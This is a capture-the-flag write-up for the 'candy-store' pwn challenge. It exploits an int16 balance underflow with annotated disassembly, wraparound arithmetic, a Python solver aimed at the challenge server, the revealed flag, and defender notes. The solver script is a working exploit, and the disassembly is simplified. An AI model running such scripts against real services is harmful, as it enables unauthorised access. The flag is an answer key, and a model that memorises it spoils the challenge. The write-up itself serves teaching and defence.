<!-- writeup by Abdelkader -->
<!-- standalone repo: https://github.com/Abdelkad3r/hasblctf-2026/tree/main/pwn/candy-store -->
<!-- (full solve.py and handout/ live there) -->

# candy-store (pwn)

| Field    | Value                                                          |
| -------- | -------------------------------------------------------------- |
| Category | pwn                                                            |
| Target   | `nc 34.77.68.154 10003` — Linux x86-64 PIE ELF, not stripped   |
| Flag     | `HASBL{Turk1sh_D3l1ght_15_Th3_B35t}`                           |

## Description

> Every children loves eating candy... but as not much as we love flags.

A candy-shop menu. You start with `$1337` and three things to buy:

```
1-  Chocolate:        $65
2-  Turkish Delight:   $250
3-  FLAG:           $32,400
4-  Exit
```

Hit `3` with a poor balance and you get the patronising

```
You don't have enough to buy the FLAG kiddo!
```

Choices 1 and 2 only *subtract* from your balance. The naive read says
this is unsolvable. The bug is one off-by-one widening: the balance is
stored as a **16-bit `word`**, but printed as a signed `int`. Subtract
enough to push it below `INT16_MIN`, and the next store wraps it into
the high-positive half of the int16 range — where the `jg`-gated FLAG
purchase happily accepts it.

## TL;DR

```c
int16_t bal = 1337;
while (true) {
    int choice = read_int();
    if (choice == 1) bal -= 65;       // chocolate
    if (choice == 2) bal -= 250;      // turkish delight
    if (choice == 3) {
        if (bal > 32399 /* signed */) { bal -= 32400; win(); }
        else puts("You don't have enough to buy the FLAG kiddo!");
    }
    printf("[!] Current balance: %d\n", (int)bal);  // sign-extended
    if (choice == 4) break;
}
```

Wrap maths: want `(1337 - K) mod 65536` reinterpreted as `int16` to land
in `[32400, 32767]`. That requires `K ∈ [34106, 34473]`. With Turkish
Delight only (`250` each): `250 · 137 = 34250 ∈ [34106, 34473]` ✓. So
**137 Turkish Delights → balance flips to `+32623` → choice `3`** calls
`win()` which printfs `flag.txt`.

```
$ ./solve.py
HASBL{Turk1sh_D3l1ght_15_Th3_B35t}
```

## Recon

```
$ file main
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ strings main | grep -i flag
./flag.txt
Couldn't open the flag file, contact to an administrator!
[!!!] Here's your FLAG: %s
FLAG: $32,400
You don't have enough to buy the FLAG kiddo!
```

`sym.win` is the only function that touches `flag.txt`. The menu is
`sym.menu`, called from `main`. Reading the menu's disassembly:

### `sym.menu` (the candy loop)

```nasm
mov  dword [var_8h], 0           ; choice = 0
mov  word  [var_2h], 0x539       ; bal   = 1337   (int16)
jmp  .check

.body:
  call banner
  lea  rsi, [var_8h]
  lea  rdi, "%d"
  call __isoc99_scanf            ; scanf("%d", &choice)

  cmp  eax, 1                    ; eax was clobbered, but choice is in var_8h
                                 ; (compiler reloads below)
  ; choice == 1 -> chocolate
  mov  ax, word [var_2h]
  sub  ax, 0x41                  ; -65
  mov  word [var_2h], ax

  ; choice == 2 -> turkish delight
  mov  ax, word [var_2h]
  sub  ax, 0xfa                  ; -250
  mov  word [var_2h], ax

  ; choice == 3 -> FLAG
  cmp  word [var_2h], 0x7E8F     ; <- compare 16-bit balance against 32399
  jg   .buy_flag                 ; SIGNED jg
  ; else: puts("You don't have enough to buy the FLAG kiddo!")
.buy_flag:
  sub  ax, 0x7E90                ; -32400
  call sym.win

.print_balance:
  movsx eax, word [var_2h]       ; sign-extend int16 to int32 for printf
  mov  esi, eax
  lea  rdi, "[!] Current balance: %d\n"
  call printf

.check:
  cmp dword [var_8h], 4
  jne .body
```

Two things to notice:

1. **The balance is a true `int16_t`.** The `sub ax, imm`/`mov word
   [var_2h], ax` pair keeps every operation in 16 bits, and the
   compare is `cmp word [var_2h], 0x7E8F` — also 16-bit.
2. **The display lies.** `printf` reads via `movsx eax, word
   [var_2h]` and prints `%d`, so the number you see on screen is
   already widened. The "minus thirty thousand" you see is the
   signed interpretation of an int16 that's marching downward; once
   it crosses `-32768` the underlying word *wraps to the positive
   side*, and the very next print shows you a big positive number.

### Choice 3's `jg` is signed

`jg` jumps when the result of `cmp` says signed-greater-than. So
"balance > 32399" is *signed* comparison on the 16-bit word — that's
why the wrap is the way through, rather than "you need 32400 dollars."

## Underflow math

Let `K` be the total amount subtracted via choices 1 and 2 (so
`K = 65a + 250b` for non-negative integers `a, b`). After `K`
subtractions, the stored 16-bit value is `(1337 - K) mod 65536`. As a
signed int16 that's:

```
v = ((1337 - K) mod 65536)
v < 32768  ⇒ signed value = v        (positive side)
v >= 32768 ⇒ signed value = v - 65536 (negative side)
```

For `signed v > 32399`, two integer windows work:

* `(1337 - K) ∈ [32400, 32767]` → would need `K < 0` (impossible — we
  can't earn money).
* `(1337 - K) ∈ [-33136, -32769]` → `K ∈ [34106, 34473]`.

So `K` has to fall in a **368-wide window centred on ~34289**. With
Turkish Delight only:

```
250 · 136 = 34000   ✗ (33999 below window)
250 · 137 = 34250   ✓
250 · 138 = 34500   ✗ (above window, balance flips into the next
                          decreasing-from-32517 range and is too low)
```

Exactly **137** Turkish Delights. Cleaner than mixing in chocolates.

After 137 subs the int16 store holds `1337 - 34250 = -32913 → +32623`
(unsigned wrap), and `cmp 32623, 32399; jg` is taken. Then choice 3
runs `sub ax, 0x7E90` (`32623 - 32400 = 223`) and calls `win()`, which
`open`s `./flag.txt`, `read`s 264 bytes, and `printf`s `"[!!!] Here's
your FLAG: %s\n"`.

## The network gotcha

The "send everything in one `sendall`" version of this exploit looks
right but fails: the server stops talking partway through. Sending all
`137 × "2\n" + "3\n4\n"` at once lands ~278 B of stdin instantly; but
each menu round prints ~200 B of banner+menu+balance, so 137 rounds is
~27 KB of stdout. The receiver (us) is async, and on a default
socket the server's send buffer fills, its `printf` blocks, its
`scanf` never gets another turn, and the whole thing wedges.

The fix is back-pressure-friendly batching: send ~20 lines at a time,
sleep 1.5 s while the recv pipe drains, repeat. With that, all 137
iterations complete and `3\n` flips into `win()`.

```
batch 1 (+20, sent  20): last3=['-3163', '-3413', '-3663']
batch 2 (+20, sent  40): last3=['-8163', '-8413', '-8663']
batch 3 (+20, sent  60): last3=['-13163', '-13413', '-13663']
batch 4 (+20, sent  80): last3=['-18163', '-18413', '-18663']
batch 5 (+20, sent 100): last3=['-23163', '-23413', '-23663']
batch 6 (+20, sent 120): last3=['-28163', '-28413', '-28663']
batch 7 (+17, sent 137): last3=['-32413', '-32663', '32623']  ← wrap
HASBL{Turk1sh_D3l1ght_15_Th3_B35t}
```

The last line of batch 7 is the unmistakable jump from `-32663` to
`32623` — that's the `sub ax, 0xFA` carrying the value past `INT16_MIN`
and landing on the high-positive side of the range.

## Exploit

```python
import socket, time, re

s = socket.create_connection(("34.77.68.154", 10003), timeout=30)

def drain(t=0.8):
    s.settimeout(t)
    out = b""
    try:
        while True:
            c = s.recv(65536)
            if not c: break
            out += c
    except socket.timeout: pass
    return out

drain(2.0)                                # banner
sent = 0
while sent < 137:
    n = min(20, 137 - sent)
    s.sendall(b"2\n" * n)
    time.sleep(1.5)
    drain()
    sent += n
s.sendall(b"3\n")
time.sleep(2.0); drain()
s.sendall(b"4\n")
time.sleep(2.0); buf = drain()
print(re.search(rb"HASBL\{[^}]+\}", buf).group().decode())
```

End-to-end run (one shot from cold cache):

```
$ ./solve.py
…
HASBL{Turk1sh_D3l1ght_15_Th3_B35t}
```

## Flag

```
HASBL{Turk1sh_D3l1ght_15_Th3_B35t}
```

## Defender notes

* **Pick *one* width for a quantity.** The bug here is the
  width mismatch between **storage** (`word`) and **display**
  (`int`). Either store the balance as a 32-bit value with the same
  semantics top-to-bottom, or display it as an `int16_t` with the
  same range markers as the underlying type. Mixing them is what
  hides the underflow from the player while still letting the
  arithmetic wrap.
* **Don't compare with `jg` against a width-mismatched immediate.**
  `cmp word [bal], 0x7E8F; jg` is reading the comparison as signed
  int16 — which is what makes the underflow useful. If the dev wanted
  "balance ≥ price" semantics in the natural sense, they should have
  used **unsigned** `cmp word [bal], 32400; jae`, which the wrap
  cannot satisfy (the wrapped value is *huge* as unsigned, so it'd
  pass too — but at least the bug would be obviously about width and
  not about signedness). The actually-right fix is to widen the
  variable, use `cmp dword [bal], 32400; jge`, and clamp at zero on
  subtraction.
* **Clamp on subtract.** Even with a 32-bit `int`, if you let the
  user subtract their way past zero you create new arithmetic
  surprises. A `if (bal < price) refuse; else bal -= price;` block at
  every transaction site removes the entire class of underflow bugs
  at the source.
* **Beware "obvious" arithmetic in a CTF.** The whole challenge
  reads like "you can't beat this, you can only lose money." That
  framing is the hint: a price puzzle where the only operation is
  subtraction *only* fails to be solvable if your accounting is in a
  type wider than the user can flip. The dev chose `int16_t` on
  purpose; the *defensive* dev would have caught the choice during
  review.
* **The "Turkish Delight at $250" path is just one of many.** Plain
  chocolates also work (`525 ≤ a ≤ 530`), as do mixes. A defender
  thinking about rate-limiting won't help here, because the attacker
  picks the fewest steps — `137` choices is well within any sane
  per-session limit.

## Files

* [`solve.py`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/candy-store/solve.py) — argparse-driven solver. Defaults to the
  live remote; `--batch` and `--drain` tune the back-pressure
  workaround.
* [`handout/main`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/candy-store/handout/main) — original ELF.

## Requirements

Python 3.9+; standard library only.
